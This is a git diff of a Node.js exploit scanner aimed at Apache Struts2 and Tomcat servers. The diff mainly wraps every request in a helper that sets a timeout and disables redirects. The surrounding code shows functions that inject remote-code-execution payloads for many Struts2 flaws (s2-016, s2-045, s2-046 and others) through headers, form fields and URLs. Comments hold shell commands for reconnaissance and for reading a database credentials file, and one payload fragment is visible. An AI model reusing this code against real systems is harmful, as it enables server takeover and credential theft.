@@ -48,6 +48,17 @@ if(0 < a.length)url = a[0];
 process.stdin.setEncoding('utf8');
 process.env.NODE_ENV = "production";
 
+
+function fnOptHeader(o)
+{
+	var k = {followAllRedirects:false,followRedirect:false,"timeout":timeout};
+	for(var i  in k)
+	{
+		o[i] = k[i];
+	}
+	return o;
+}
+
 // tomcat测试
 // https://www.exploit-db.com/exploits/41783/
 // /?{{%25}}cake\=1
@@ -55,7 +66,7 @@ process.env.NODE_ENV = "production";
 // 基于socket发送数据
 function fnSocket(h,p,szSend,fnCbk)
 {
-	const client = net.connect({"port": p,"host":h,"timeout":timeout}, () => 
+	const client = net.connect(fnOptHeader({"port": p,"host":h}), () => 
 	{
 	  client.write(szSend);
 	});
@@ -148,8 +159,8 @@ function fnDoHostAttack(url,fnCbk)
 function fnTest(s)
 {
 	request(
-	    { method: s ||'PUT'
-	    ,"timeout":timeout, uri: url//.substr(0,url.lastIndexOf("/"))
+	    fnOptHeader({ method: s ||'PUT'
+	    ,uri: url//.substr(0,url.lastIndexOf("/"))
 	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
 	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
 	      [ { 'content-type': 'application/json'
@@ -157,7 +168,7 @@ function fnTest(s)
 	        }
 	      , { body: 'I am an attachment' }
 	      ]
-	    }
+	    })
 	  , function (error, response, body) {
 	  		if(!response)return;
 	      	if(response && -1 <  [201,200].indexOf(response.statusCode))
@@ -196,7 +207,7 @@ function fnTest(s)
 
 function doStruts2_046(url)
 {
-	request({method: 'POST',"timeout":timeout,uri: url,"formData":
+	request(fnOptHeader({method: 'POST',uri: url,"formData":
 		{
 			custom_file:
 			{
@@ -207,7 +218,7 @@ function doStruts2_046(url)
 					"contentType": "image/jpeg"
 				}
 			}
-		}},
+		}}),
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-046");
@@ -220,7 +231,7 @@ function doStruts2_032(url)
 	var oParms = {};
 	oParms["method:" + encodeURIComponent(g_postData)] = "";
 	oParms["mtxtest"] = "ok";
-	request({method: 'POST',"timeout":timeout,uri: url,"formData":oParms},
+	request(fnOptHeader({method: 'POST',uri: url,"formData":oParms}),
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-032");
@@ -232,7 +243,7 @@ function doStruts2_032(url)
 function doStruts2_037(url)
 {
 	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
-	request({method: 'POST',"timeout":timeout,uri: url},
+	request(fnOptHeader({method: 'POST',uri: url}),
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-037");
@@ -242,7 +253,7 @@ function doStruts2_037(url)
 function doStruts2_033(url)
 {
 	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ",mtx.toString.json?ok=1";
-	request({method: 'POST',"timeout":timeout,uri: url},
+	request(fnOptHeader({method: 'POST',uri: url}),
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-037");
@@ -270,7 +281,7 @@ function doStruts2_048(url,fnCbk)
         "name": g_postData || payload,
         "age": 20
     };
-    request({method: 'POST',"timeout":timeout,uri: url,"formData":data,"headers":{Referer:url}},
+    request(fnOptHeader({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}}),
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-048");
@@ -302,8 +313,8 @@ function doStruts2_016(url)
 		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
 		+ ".(#ros.flush()).(#ros.close())}");
 	////////////////////////*/
-	request({method: 'GET',"timeout":timeout,encoding: null,uri: url + "?redirect:" + encodeURIComponent(g_postData)
-		}, 
+	request(fnOptHeader({method: 'GET',encoding: null,uri: url + "?redirect:" + encodeURIComponent(g_postData)
+		}), 
     	function(e,r,b)
     {
     	// console.log(b);
@@ -411,13 +422,13 @@ function doStruts2_045(url, fnCbk)
 {
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
 	//  && cat #curPath/WEB-INF/jdbc.propertis
-	request({method: 'POST',"timeout":timeout,uri: url
+	request(fnOptHeader({method: 'POST',uri: url
 	    ,headers:
 	    {
 	    	"User-Agent": g_szUa,
 	    	// encodeURIComponent不能编码 2017-07-18
 	    	"Content-Type":g_postData
-	    }}
+	    }})
 	  , function (error, response, body){
 	  		if(body)
 	  		{
@@ -432,7 +443,7 @@ function doStruts2_DevMode(url)
 {
 	// debug=browser&object=
 	// debug=command&expression=
-	request({method: 'POST',"timeout":timeout,uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"},
+	request(fnOptHeader({method: 'POST',uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"}),
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-DevMode");
@@ -444,7 +455,7 @@ function doStruts2_DevMode(url)
 function doStruts2_001(url)
 {
 	// 如果编码encodeURIComponent 就会导致不执行？
-	request({method: 'POST',"timeout":timeout,uri: url + "?name=" + (g_postData)},
+	request(fnOptHeader({method: 'POST',uri: url + "?name=" + (g_postData)}),
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-001,s2-012");
@@ -456,13 +467,13 @@ function doStruts2_019(url, fnCbk)
 {
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
 	//  && cat #curPath/WEB-INF/jdbc.propertis
-	request({method: 'POST',"timeout":timeout,uri: url,
+	request(fnOptHeader({method: 'POST',uri: url,
 		"formData":{"debug":"command","expression":encodeURIComponent(g_postData)}
 	    ,headers:
 	    {
 	    	"User-Agent": g_szUa,
 	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }}
+	    }})
 	  , function (error, response, body){
 	  		if(body)
 	  		{
@@ -493,13 +504,13 @@ function doStruts2_029(url, fnCbk)
 
 		
 
-	request({method: 'POST',"timeout":timeout,uri: url,
+	request(fnOptHeader({method: 'POST',uri: url,
 		"formData":{"message":encodeURIComponent(szDPt)}
 	    ,headers:
 	    {
 	    	"User-Agent": g_szUa,
 	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }}
+	    }})
 	  , function (error, response, body){
 	  		if(body)
 	  		{
@@ -618,12 +629,12 @@ function fnCheckTa3(u)
 	else u += '/';
 	var s = __dirname + "/urls/ta3menu.txt",a,i = 0,fnCbk = function(url)
 	{
-		request({method: 'GET',"timeout":timeout,uri: u + url
+		request(fnOptHeader({method: 'GET',uri: u + url
 		    ,headers:
 		    {
 		    	"User-Agent": g_szUa
 		    }
-		}
+		})
 		, function (error, response, body)
 		{
 			if(!error && body)
